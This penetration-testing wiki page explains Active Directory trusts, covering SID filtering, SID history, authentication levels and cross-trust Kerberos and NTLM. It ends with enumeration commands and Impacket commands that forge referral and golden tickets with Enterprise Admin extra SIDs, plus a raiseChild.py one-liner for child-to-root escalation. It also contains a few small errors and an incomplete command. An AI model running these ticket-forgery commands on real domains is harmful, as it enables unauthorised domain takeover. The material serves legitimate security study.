# Trusts

{% hint style="warning" %}
**This is a work-in-progress**. It's indicated with the 🛠️ emoji in the page name or in the category name
{% endhint %}

## Theory

#### Definitions

An **Active Directory domain** is a logical grouping of objects (such as users, computers, and devices) that share a common directory database and security policies and that are all managed together

**A forest** is a collection of one or more Active Directory domains that share a common schema, configuration, and global catalog. The schema defines the kinds of objects that can be created within the forest, and the global catalog is a centralized database that contains a searchable, partial replica of every domain in the forest.

**Active Directory Trusts** allows different AD domains or forests to communicate and share resources. Trusts enable users in one domain to access resources in another without needing separate credentials.

{% hint style="info" %}
A trust relationship allows users in one domain to authenticate to the other domain's resources, but it does not automatically grant access to them. Access to resources is controlled by permissions, which must be granted explicitly to the user in order for them to access the resources. Simply establishing a trust relationship does not automatically grant access to resources.&#x20;

In order to access a "trusting" resource, a "trusted" user must have the appropriate permissions to that resource. These permissions can be granted by adding the user to a group that has access to the resource, or by giving the user explicit permissions to the resource.
{% endhint %}

#### Global Catalog <a href="#global-catalog" id="global-catalog"></a>

The global catalog is a partial copy of all objects in an Active Directory forest, meaning that some object properties (but not all) are contained within it. This data is replicated among all domain controllers marked as global catalogs for the forest. One of the Global Catalog's purposes is to facilitate quick object searching and conflict resolution without the necessity of referring to other domains [(more information here)](https://technet.microsoft.com/en-us/library/cc978012.aspx).

The initial global catalog is generated on the first domain controller created in the first domain in the forest. The first domain controller for each new child domain is also set as a global catalog by default, but others can be added.

The GC allows both users and applications to find information about any objects in ANY domain in the forest. The Global Catalog performs the following functions:

* Authentication (provided authorization for all groups that a user account belongs to, which is included when an access token is generated)
* Object search (making the directory structure within a forest transparent, allowing a search to be carried out across all domains in a forest by providing just one attribute about an object.)

#### Trust types <a href="#trust-types" id="trust-types"></a>

The `trustType` attribute of a TDO specifies the type of trust that is established. Here are the different trust types (section [6.1.6.7.15 "trustType"](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/36565693-b5e4-4f37-b0a8-c1b12138e18e) of \[MS-ADTS]):

1. Downlevel: a trust with a domain that is running a version of Windows NT 4.0 or earlier.
2. Uplevel: a trust with a domain that is running Windows 2000 or later.
3. MIT: a trust with a non-Windows Kerberos realm, typically used for interoperability with UNIX-based systems running MIT Kerberos.
4. DCE: not used in Windows. Would refer to trusts with a domain running [DCE](http://www.opengroup.org/dce/info/).
5. AAD: the trusted domain is in Azure Active Directory.

#### Trust flavor <a href="#trust-flavor" id="trust-flavor"></a>

The trust "flavor", on the other hand, represents the nature of the trust relationship between domains or forests. It is not a direct attribute but is identified based on other TDO attributes (see ["How Domain and Forest Trusts Work > Trust Types"](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178\(v=ws.10\)#trust-types)).

1. Parent-Child: this type of trust relationship exists between a parent domain and a child domain in the same forest. The parent domain trusts the child domain, and the child domain trusts the parent domain. This type of trust is automatically created when a new child domain is created in a forest.
2. Tree-Root: exists between the root domain of a tree and the root domain of another tree in the same forest. This type of trust is automatically created when a new tree is created in a forest.
3. Shortcut (a.k.a. cross-link): exists between two child domains of different tree (i.e. different parent domains) within the same forest. This type of trust relationship is used to reduce the number of authentication hops between distant domains. It is a one-way or two-way transitive trust.
4. External: exists between a domain in one forest and a domain in a different forest. It allows users in one domain to access resources in the other domain. It's usually set up when accessing resources in a forest without trust relationships established.
5. Forest: exists between two forests (i.e. between two root domains in their respective forest). It allows users in one forest to access resources in the other forest.
6. Realm: exists between a Windows domain and a non-Windows domain, such as a Kerberos realm. It allows users in the Windows domain to access resources in the non-Windows domain.

| Trust type                   | Transitivity   | Direction | Auth. mechanisms | Creation mode |
| ---------------------------- | -------------- | --------- | ---------------- | ------------- |
| Parent-Child                 | Transitive     | Two-way   | Either           | Automatic     |
| Tree-Root                    | Transitive     | Two-way   | Either           | Automatic     |
| Shortcut (a.k.a. cross-link) | Transitive     | Either    | Either           | Manual        |
| Realm                        | Either         | Either    | Kerberos V5 only | Manual        |
| Forest                       | Transitive     | Either    | Either           | Manual        |
| External                     | Non-transitive | One-way   | NTLM only        | Manual        |

#### Transitivity <a href="#transitivity" id="transitivity"></a>

In Active Directory, a transitive trust is a type of trust relationship that allows access to resources to be passed from one domain to another. When a transitive trust is established between two domains, any trusts that have been established with the first domain are automatically extended to the second domain. This means that if Domain A trusts Domain B and Domain B trusts Domain C, then Domain A automatically trusts Domain C, even if there is no direct trust relationship between Domain A and Domain C. Transitive trusts are useful in large, complex networks where multiple trust relationships have been established between many different domains. They help to simplify the process of accessing resources and reduce the number of authentication hops that may be required.

The transitivity status of a trust depends on the [trustAttributes](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c) flags of a [TDO](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4).

> * If the `TRUST_ATTRIBUTE_NON_TRANSITIVE (0x00000001)` flag is set then the transitivity is disabled.
> * If the `TRUST_ATTRIBUTE_WITHIN_FOREST (0x00000020)` flag is set then the transitivity is enabled.
> * If the `TRUST_ATTRIBUTE_FOREST_TRANSITIVE (0x00000008)` flag is set then the transitivity is enabled.
>
> In any other case the transitivity is disabled.
>
> _(by_ [_Carsten Sandker_](https://twitter.com/0xcsandker) _on_ [_www.securesystems.de_](https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/)_)_

#### SID filtering <a href="#sid-filtering" id="sid-filtering"></a>

According to Microsoft, the security boundary in Active Directory is the forest, not the domain. The forest defines the boundaries of trust and controls access to resources within the forest.

The domain is a unit within a forest and represents a logical grouping of users, computers, and other resources. Users within a domain can access resources within their own domain and can also access resources in other domains within the same forest, as long as they have the appropriate permissions. Users cannot access resources in other forests unless a trust relationship has been established between the forests.

SID filtering plays an important role in the security boundary by making sure "only SIDs from the trusted domain will be accepted for authorization data returned during authentication. SIDs from other domains will be removed" (`netdom` cmdlet output). By default, SID filtering is disabled for intra-forest trusts, and enabled for inter-forest trusts.

![](https://www.thehacker.recipes/assets/SID%20filtering%20default%20configs.BWeXqOoS.png)

Default configurations (source: [securesystems.de](https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/))

![](https://www.thehacker.recipes/assets/SID%20filtering%20custom%20configs.CB0x9lVQ.png)

Custom configurations (source: [securesystems.de](https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/))

Section [4.1.2.2](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280) of \[MS-PAC] specifies what is filtered and when. There are three important things to remember from this documentation:

* if SID filtering is fully enabled, all SIDs that differ from the trusted domain will be filtered out
* even if it's enabled, a few SIDs will (almost) never be filtered: "Enterprise Domain Controllers" (S-1-5-9) SID and those described by the [trusted domain object (TDO)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/f2ef15b6-1e9b-48b5-bf0b-019f061d41c8#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4), as well as seven well-known SIDs (see [MS-PAC doc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280), and [improsec's blogpost](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-3-sid-filtering-explained#yui_3_17_2_1_1673614140169_543)).
* there are two kinds of inter-forest trusts: "Forest", and "External" (see [trust types](https://www.thehacker.recipes/ad/movement/trusts/index#trust-types)). Microsoft says "[cross-forest trusts are more stringently filtered than external trusts](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN)", meaning that in External trusts, SID filtering only filters out RID < 1000.

![](https://www.thehacker.recipes/assets/MS%20PAC%20section%204.1.2.2.Cmw5BXcP.png)

\[MS-PAC] section 4.1.2.2

The SID filtering status of a trust depends on the [trustAttributes](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c) flags of a [TDO](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4) as well as the type of trust.

> * If the `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN (0x00000004)` flag is set, then only SIDs from the trusted domain are allowed (all others are filtered
>
> _(by_ [_Carsten Sandker_](https://twitter.com/0xcsandker) _on_ [_www.securesystems.de_](https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/)_)_
>
> * If the `TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL (0x00000040)` flag is set, then inter-forest ticket can be forged, spoofing an RID >= 1000. Of course, this doesn't apply if TAQD (`TRUST_ATTRIBUTE_QUARANTINED_DOMAIN`) is set.
>
> _(sources: section_ [_6.1.6.7.9_](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c?redirectedfrom=MSDN) _of \[MS-ADTS], and section_ [_4.1.2.2_](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280) _of \[MS-PAC])._

Above are some key, usually valid, elements. But as [Carsten Sandker](https://twitter.com/0xcsandker) puts it: "the logic that sits behind this might be too complex to put it in text". To really know the behavior of SID filtering for a trust, refer to the lookup tables [here](https://www.securesystems.de/images/blog/active-directory-spotlight-trusts-part-2-operational-guidance/OC-b4We5WFiXhTirzI_Dyw.png) (for default trusts setups) and [there](https://www.securesystems.de/images/blog/active-directory-spotlight-trusts-part-2-operational-guidance/99icUS7SKCscWq6VzW0o5g.png) (for custom configs).

SID filtering is not unique to trusts. It occurs "[whenever a service ticket is accepted](https://twitter.com/SteveSyfuhs/status/1329148611305693185)" either by the KDC or by a local service and behaves differently depending on the contect in which the ticket was produced.

Also, SID filtering works the same way for NTLM and Kerberos. It's a separate mechanism invoked after user logon info are unpacked (more details in [NTLM](https://www.thehacker.recipes/ad/movement/trusts/index#ntlm-authentication) and [Kerberos](https://www.thehacker.recipes/ad/movement/trusts/index#kerberos-authentication) chapters).

#### SID history <a href="#sid-history" id="sid-history"></a>

The SID (Security Identifier) is a unique identifier that is assigned to each security principal (e.g. user, group, computer). It is used to identify the principal within the domain and is used to control access to resources.

The SID history is a property of a user or group object that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.

Many resources across the Internet, including Microsoft's docs and tools, state that SID history can be enabled across a trust. This is not 100% true. SID history is not a feature that can be toggled on or off per say.

When authenticating across trusts [using Kerberos](https://www.thehacker.recipes/ad/movement/trusts/index#kerberos-authentication), it is assumed that the extra SID field of the ticket's PAC (Privileged Attribute Certificate) reflects the SID history attribute of the authenticating user. With [SID filtering](https://www.thehacker.recipes/ad/movement/trusts/index#sid-filtering) enabled in a trust, the SIDs contained in that field are filtered, effectively preventing SID history from doing its job. There are certain scenarios where some SIDs are not filtered, allowing for example SIDs with a RID >= 1000. Some, including Microsoft, call it "enabling SID history", but in fact, SID history is not toggled on or off here, it's the behavior of SID filtering that is adjusted. I'd call that "partial SID filtering", or "unencumbered SID history". [Dirk-jan Mollema](https://twitter.com/_dirkjan) calls that "[SID filtering relaxation](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/#sid-filtering-relaxation)".

When authenticating with NTLM, the process is highly similar, see the [NTLM authentication](https://www.thehacker.recipes/ad/movement/trusts/index#ntlm-authentication) theory chapter for more information.

#### Authentication level <a href="#authentication-level" id="authentication-level"></a>

Inter-forest trusts ("External" and "Forest" trusts) can be configured with different levels of authentication:

* Forest-wide authentication: allows unrestricted authentication from the trusted forest's principals to the trusting forest's resources. This is the least secure level, it completely opens one forest to another (authentication-wise though, not access-wise). This level is specific to intra-forest trusts.
* Domain-wide authentication: allows unrestricted authentication from the trusted domain's principals to the trusting domain's resources. This is more secure than forest-wide authentication because it only allows users in a specific (trusted) domain to access resources in another (trusting).
* Selective authentication: allows only specific users in the trusted domain to access resources in the trusting domain. This is the most secure type of trust because it allows administrators to tightly control access to resources in the trusted domain. In order to allow a "trusted user" to access a "trusting resource", the resource's DACL must include an ACE in which the trusted user has the "`Allowed-To-Authenticate`" extended right (GUID: `68b1d179-0d15-4d4f-ab71-46152e79a7bc`).

It's worth noting that selective authentication is less used by the general public due to its complexity, but it's definitely the most restrictive, hence secure, choice.

The authentication level of a trust depends on the [trustAttributes](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c) flags of a [TDO](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4).

> * If the trust relationship is made within a forest boundary (aka if the `TRUST_ATTRIBUTE_WITHIN_FOREST (0x00000020)` flag is set), then Forest-Wide Authentication will always be used.
> * f the trust relationship crosses a forest boundary and the `TRUST_ATTRIBUTE_CROSS_ORGANIZATION (0x00000010)` flag is set then Selective Authentication is used.
> * If the trust relationship crosses a forest boundary, but the trust is marked as transitive (aka if the `TRUST_ATTRIBUTE_FOREST_TRANSITIVE (0x00000008)` flag is set), then Forest-Wide Authentication will be used.
>
> In any other case Domain-Wide Authentication is used.
>
> _Interesting to note: Trusts within a Forest always use Forest-Wide Authentication (and this can not be disabled)._
>
> _(by_ [_Carsten Sandker_](https://twitter.com/0xcsandker) _on_ [_www.securesystems.de_](https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/)_)_

#### TGT delegation <a href="#tgt-delegation" id="tgt-delegation"></a>

Kerberos unconstrained delegation (KUD) allows a service configured for it to impersonate (almost) any user on any other service. This is a dangerous feature to configure, that won't be explained into many details here as the [Kerberos](https://www.thehacker.recipes/ad/movement/kerberos/index#delegations), [Kerberos delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations/index) and [Kerberos unconstrained delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained) pages already cover it.

Kerberos unconstrained delegations could be abused across trusts to take control over any resource of the trusting domain, including the domain controller, as long as the trusted domain is compromised. This relies on the delegation of TGT across trusts, which can be disabled.

If TGT delegation is disabled in a trust, attackers won't be able to [escalate from one domain to another by abusing unconstrained delegation](https://www.thehacker.recipes/ad/movement/trusts/index#unconstrained-delegation-abuse). On a side note, the other types of delegations are not affected by this as they don't rely on the delegation of tickets, but on S4U extensions instead.

The TGT delegation status of a trust depends on the [trustAttributes](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c) flags of a [TDO](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4).

> * If the `TRUST_ATTRIBUTE_CROSS_ORGANIZATION_NO_TGT_DELEGATION (0x00000200)` flag is set, then TGT Delegation is disabled.
> * If the `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN (0x00000004)` flag is set, then TGT Delegation is disabled.
> * If the `TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION (0x00000800)`flag is set, then TGT Delegation is enabled.
> * If the `TRUST_ATTRIBUTE_WITHIN_FOREST (0x00000020)` flag is set, then TGT Delegation is enabled.
>
> _(by_ [_Carsten Sandker_](https://twitter.com/0xcsandker) _on_ [_www.securesystems.de_](https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/)_)_

#### Kerberos authentication <a href="#kerberos-authentication" id="kerberos-authentication"></a>

Understanding how Kerberos works is required here: [the Kerberos protocol](https://www.thehacker.recipes/ad/movement/kerberos/index).

> For a Kerberos authentication to occur across a domain trust, the Kerberos key distribution centers (KDCs) in two domains must have a shared secret, called an inter-realm key. This key is [derived from a shared password](https://msdn.microsoft.com/en-us/library/windows/desktop/aa378170\(v=vs.85\).aspx), and rotates approximately every 30 days. Parent-child domains share an inter-realm key implicitly.
>
> When a user in domain A tries to authenticate or access a resource in domain B that he has established access to, he presents his ticket-granting-ticket (TGT) and request for a service ticket to the KDC for domain A. The KDC for A determines that the resource is not in its realm, and issues the user a referral ticket.
>
> This referral ticket is a ticket-granting-ticket (TGT) encrypted with the inter-realm key shared by domain A and B. The user presents this referral ticket to the KDC for domain B, which decrypts it with the inter-realm key, checks if the user in the ticket has access to the requested resource, and issues a service ticket. This process is described in detail in [Microsoft’s documentation](https://technet.microsoft.com/en-us/library/cc772815\(v=ws.10\).aspx#w2k3tr_kerb_how_pzvx) in the Simple Cross-Realm Authentication and Examples section.
>
> _(by_ [_Will Schroeder_](https://twitter.com/harmj0y) _on_ [_blog.harmj0y.net_](https://blog.harmj0y.net/redteaming/domain-trusts-were-not-done-yet/)_)_

From an offensive point of view, just like a [golden ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden), a referral ticket could be forged. Forging a referral ticket using the inter-realm key, instead of relying on the krbtgt keys for a golden ticket, is a nice alternative for organizations that choose to roll their krbtgt keys, as they should. This technique is [a little bit trickier](https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/#do-you-need-to-use-inter-realm-tickets) though, as it requires to [use the correct key](https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/#which-keys-do-i-need-for-inter-realm-tickets).

Depending on the trust characteristics, ticket forgery can also be combined with [SID history](https://www.thehacker.recipes/ad/movement/trusts/index#sid-history) spoofing for a direct privilege escalation from a child to a parent domain.

When doing Kerberos authentications across trusts, the trusting domain's domain controller [checks a few things](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/bac4dc69-352d-416c-a9f4-730b81ababb3) before handing out service tickets to trusted users: [SID filtering](https://www.thehacker.recipes/ad/movement/trusts/index#sid-filtering) during [PAC validation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280) (looking in the `ExtraSids` attribute from the [`KERB_VALIDATION_INFO`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/69e86ccc-85e3-41b9-b514-7d969cd0ed73) structure in the PAC), [TGT delegation](https://www.thehacker.recipes/ad/movement/trusts/index#tgt-delegation) verification (when asked for a Service Ticket for a service configured for unconstrained delegation), and [Selective Authentication](https://www.thehacker.recipes/ad/movement/trusts/index#authentication-level) limitation.

#### NTLM authentication <a href="#ntlm-authentication" id="ntlm-authentication"></a>

In an NTLM authentication sequence, a user authenticates to a resource by sending an NTLM Negotiate message, receiving an NTLM Challenge, and then sending back an NTLM Authenticate. The server then passes the logon request through to the Domain Controller, using the Netlogon Remote Protocol.

> This mechanism of delegating the authentication request to a DC is called pass-through authentication.
>
> Upon successful validation of the user credentials on the DC, the Netlogon Remote Protocol delivers the user authorization attributes (referred to as user validation information) back to the server over the secure channel.
>
> _(_[_Microsoft.com_](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/70697480-f285-4836-9ca7-7bb52f18c6af)_)_

When using NTLM across trust relationships, the process is very similar.

When a trusted domain's user wants to access a resource from a trusting domain, the user and the resource engage in the standard 3-way NTLM handshake. Upon receiving the NTLM Authenticate message, the resource forwards it to its own domain controller through a Netlogon "[workstation secure channel](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/08b36439-331a-4e20-89a5-12f3fab33dfc)". The trusting DC forwards it as well to the trusted domain's DC through a Netlogon "[trusted domain secure channel](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/08b36439-331a-4e20-89a5-12f3fab33dfc)".

The trusted domain's DC does the usual checks and passes the result to the trusting DC, which in turn passes it to the resource. The resource then accepts or rejects the authentication based on the decision passed through the DCs.

When doing NTLM authentications across trusts, the trusting domain's domain controller checks a few things from the user info structure supplied by the trusted domain controller: [SID filtering](https://www.thehacker.recipes/ad/movement/trusts/index#sid-filtering) (looking in the `ExtraSids` attribute from the [`NETLOGON_VALIDATION_SAM_INFO2`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/2a12e289-7904-4ecb-9d83-6732200230c0) structure), and [Selective Authentication](https://www.thehacker.recipes/ad/movement/trusts/index#authentication-level) limitation during the [DC's validation of the user credentials](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/f47e40e1-b9ca-47e2-b139-15a1e96b0e72). [TGT delegation](https://www.thehacker.recipes/ad/movement/trusts/index#tgt-delegation) verification doesn't occur here, since it's a Kerberos mechanism.

_Nota bene, wether it's Kerberos or NTLM, the ExtraSids are in the same data structure, it's just named differently for each protocol. And, the SID filtering function called by the trusting DC is the same, for both authentication protocols._

## Practice

### Enumeration

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, tools like [NetExec ](https://github.com/Pennyw0rth/NetExec)(Python), [ldapsearch](https://git.openldap.org/openldap/openldap) (C) , [BloodyAd ](https://github.com/CravateRouge/bloodyAD)(Python) can be used to enumerate trusts.

```bash
# ldapsearch
ldapsearch -h ldap://<DC_IP> -b "CN=SYSTEM,DC=$DOMAIN" "(objectclass=trustedDomain)"

# NetExec
nxc ldap <DC_IP> -u <USER>-p <PASSWORD> -M enum_trusts

# Transitive trusts resolution using BloodyAD
python bloodyAD.py -d <DOMAIN> <USER>-p <PASSWORD> --host <DC_IP> get trusts --transitive-trust --dns <DNS_IP>
```
{% endtab %}

{% tab title="Windows" %}
From Windows systems tools like [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) (PowerShell) and [netdom](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc772217\(v=ws.11\)) may be used to enumerate trusts :

**LOLBin**

From domain-joined hosts, the `netdom` or `nltest` commands can be used.

```powershell
# Native CMD
netdom trust /domain:DOMAIN.LOCAL
nltest /trusted_domains /v

# Native Powershell
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

**PowerView**

Alternatively, [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)'s [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) (PowerShell) supports multiple commands for various purposes.

```powershell
# Enumerate domain trust relationships of the current user's domain
Get-NetDomainTrust
Get-NetDomainTrust –Domain [Domain Name]
Get-NetDomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

# Enumerate forest trusts from the current domain's perspective
Get-NetForestTrust
Get-NetForestDomain -Forest [Forest Name]

# Enumerate all the trusts of all the domains found
Get-NetForestDomain | Get-NetDomainTrust

# Enumerate and map all domain trusts
Invoke-MapDomainTrust

#Get users with privileges in other domains inside the forest
Get-DomainForeingUser

#Get groups with privileges in other domains inside the forest
Get-DomainForeignGroupMember
```

> The [global catalog is a partial copy of all objects](https://technet.microsoft.com/en-us/library/cc728188\(v=ws.10\).aspx) in an Active Directory forest, meaning that some object properties (but not all) are contained within it. This data is replicated among all domain controllers marked as global catalogs for the forest. Trusted domain objects are replicated in the global catalog, so we can enumerate every single internal and external trust that all domains in our current forest have extremely quickly, and only with traffic to our current PDC.
>
> _(by_ [_Will Schroeder_](https://twitter.com/harmj0y) _on_ [_blog.harmj0y.net_](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)_)_

**BloodHound**

[BloodHound](https://www.thehacker.recipes/a-d/recon/bloodhound) can also be used to map the trusts. While it doesn't provide much details, it shows a visual representation.
{% endtab %}
{% endtabs %}

### Forging Tickets

When forging a[ referral ticket](domain-trusts.md#referral-ticket), or a [golden ticket](domain-trusts.md#golden-ticket), additional security identifiers (SIDs) can be added as "extra SID" and be considered as part of the user's [SID history](domain-trusts.md#sid-history) when authenticating.

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Impacket](https://github.com/fortra/impacket) scripts (Python) can be used for that purpose.

* ticketer.py to forge tickets
* getST.py to request service tickets
* lookupsid.py to retrieve the domains' SIDs

If SID filtering is disabled, set the RID to 519 to act as Enterprise Admin.

If SID filtering is partially enabled, set the RID >=1000.

#### **Referral ticket**

```bash
# 1. forge the ticket
ticketer.py -nthash "inter-realm key" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "<root_domain_SID>-<RID>" -spn "krbtgt/root_domain_fqdn" "someusername"

# 2. use it to request a service ticket
KRB5CCNAME="someusername.ccache" getST.py -k -no-pass -debug -spn "CIFS/domain_controller" "root_domain_fqdn/someusername@root_domain_fqdn"
```

```bash
ticketer.py -nthash "child_domain_krbtgt_NT_hash" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "-" "someusername"
```

#### **Golden ticket**

```bash
# 1. forge the ticket
ticketer.py -nthash "child_domain_krbtgt_NT_hash" -domain-sid "child_domain_SID" -domain "child_domain_FQDN" -extra-sid "<root_domain_SID>-<RID>" "someusername"
```

Impacket's [raiseChild.py](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py) script can also be used to conduct the golden ticket technique automatically when SID filtering is disabled (retrieving the SIDs, dumping the trusted domain's krbtgt, forging the ticket, dumping the forest root keys, etc.). It will forge a ticket with the Enterprise Admins extra SID.

```bash
raiseChild.py "child_domain"/"child_domain_admin":"$PASSWORD"
```
{% endtab %}

{% tab title="Windows" %}

{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)?redirectedfrom=MSDN" %}

{% embed url="https://www.thehacker.recipes/ad/movement/trusts" %}

{% embed url="https://mayfly277.github.io/posts/GOADv2-pwning-part12/" %}

{% embed url="https://medium.com/r3d-buck3t/breaking-domain-trusts-with-forged-trust-tickets-5f03fb71cd72" %}

{% embed url="https://blog.improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted" %}

{% embed url="https://attack.mitre.org/techniques/T1482/" %}

{% embed url="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/attack-trusts" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/" %}

{% embed url="https://www.semperis.com/blog/ad-security-research-breaking-trust-transitivity/" %}
